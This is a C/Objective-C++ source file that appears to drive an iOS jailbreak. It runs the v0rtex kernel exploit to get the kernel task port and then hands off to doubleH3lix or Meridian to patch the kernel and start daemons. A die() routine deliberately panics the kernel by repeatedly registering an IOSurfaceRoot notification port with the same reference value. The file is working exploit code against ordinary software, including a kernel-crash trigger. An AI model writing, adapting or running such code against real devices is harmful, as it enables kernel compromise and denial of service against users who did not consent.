#include <errno.h>
#include <stdbool.h>
#include <stdlib.h>             // exit
#include <string.h>             // strerror, strncmp
#include <unistd.h>             // access, sleep
#include <sys/sysctl.h>         // sysctlbyname
#include <mach/mach.h>
#include <liboffsetfinder64/liboffsetfinder64.hpp>

extern "C"
{
#   include "common.h"
#   include "v0rtex.h"

    typedef mach_port_t io_service_t;
    typedef mach_port_t io_connect_t;
    extern const mach_port_t kIOMasterPortDefault;
    CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
    io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
    kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *client);
    kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
}

__attribute__((noreturn)) static void die()
{
    // open user client
    CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
    io_connect_t connect = 0;
    IOServiceOpen(service, mach_task_self(), 0, &connect);

    // add notification port with same refcon multiple times
    mach_port_t port = 0;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    uint64_t references;
    uint64_t input[3] = {0};
    input[1] = 1234;  // keep refcon the same value
    while (1)
        IOConnectCallAsyncStructMethod(connect, 17, port, &references, 1, input, sizeof(input), NULL, NULL);
}

#define min(a, b) ((a) < (b) ? (a) : (b))

static bool useMeridian(void)
{
    // 0 uninit
    // 1 doubleH3lix
    // 2 Meridian
    static int state = 0;
    if(state == 0)
    {
        char buf[0x20] = { 0 };
        size_t len = sizeof(buf);
        int r = sysctlbyname("hw.machine", buf, &len, NULL, 0);
        if(r != 0)
        {
            LOG("sysctlbyname: %s", strerror(errno));
            exit(-1);
        }
        LOG("machine: %-*s", (int)len, buf);
        if(strncmp("iPhone9,", buf, min(8, len)) == 0 || strncmp("iPad7,", buf, min(6, len)) == 0)
        {
            state = 2;
        }
        else
        {
            // TODO
            if(access("/meridian", F_OK) == 0)
            {
                state = 2;
            }
            else
            {
                state = 1;
            }
        }
    }
    return state == 2;
}

// doubleH3lix
extern kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data);
extern void runLaunchDaemons(void);
// Meridian
extern "C"
{
    extern offsets_t *offsets;
    extern kern_return_t callback(task_t kern_task, kptr_t kbase, void *cb_data);
    extern int makeShitHappen(void);
}

typedef struct
{
    task_t ktask;
    kptr_t kbase;
} fuck_t;

static kern_return_t fuck(task_t ktask, kptr_t kbase, void *data)
{
    fuck_t *f = (fuck_t*)data;
    f->ktask = ktask;
    f->kbase = kbase;
    return KERN_SUCCESS;
}

int main(void)
{
#if 0
to remove:

main
v0rtex
offsets (except struct def (BUT version))
move code from runV0rtex to makeShitHappen
#endif
    @autoreleasepool
    {
        LOG("we out here\n");

        tihmstar::offsetfinder64 fi("/System/Library/Caches/com.apple.kernelcaches/kernelcache");

        offsets_t *off = NULL;
        try
        {
            off = get_offsets(&fi);
        }
        catch (tihmstar::exception &e)
        {
            LOG("Offset error: %s [%u]", e.what(), e.code());
            return -1;
        }
        catch (std::exception &e)
        {
            LOG("Fatal offset error: %s", e.what());
            return -1;
        }

        LOG("v0rtex\n");
        fuck_t fu;
        if(v0rtex(off, &fuck, &fu) != KERN_SUCCESS)
        {
            LOG("Kernel exploit failed, goodbye...");
            sleep(1);
            die();
        }
        LOG("Kernel patches done...");

        if(useMeridian())
        {
            offsets = off;
            kern_return_t ret = callback(fu.ktask, fu.kbase, NULL);
            if(ret != KERN_SUCCESS)
            {
                LOG("callback: %x", ret);
                return -1;
            }
            makeShitHappen();
        }
        else
        {
            kern_return_t ret = cb(fu.ktask, fu.kbase, &fi);
            if(ret != KERN_SUCCESS)
            {
                LOG("cb: %x", ret);
                return -1;
            }
            runLaunchDaemons();
        }

        sleep(60);
        LOG("The fuck, why we still here?");
    }
    return -1;
}
